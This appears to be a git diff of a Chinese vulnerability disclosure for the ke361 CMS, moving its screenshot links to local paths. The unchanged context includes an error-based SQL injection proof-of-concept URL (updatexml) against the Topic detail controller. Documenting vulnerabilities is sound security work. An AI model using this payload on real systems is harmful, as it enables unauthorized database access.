@@ -18,7 +18,7 @@ https://gitee.com/jcove/ke361
 
 存在漏洞的文件为 Application/Home/Controller/TopicController.class.php, 漏洞函数详情
 
-![image-20220518153711939](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181537005.png)
+![image-20220518153711939](./images/202205181537005.png)
 
 ```
 public function detail(){
@@ -48,6 +48,6 @@ public function detail(){
 /index.php?s=/Topic/detail/id/1)%20%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+
 ```
 
-![image-20220518153727479](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181537557.png)
+![image-20220518153727479](./images/202205181537557.png)
 
-![image-20220518153736954](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181537004.png)
+![image-20220518153736954](./images/202205181537004.png)
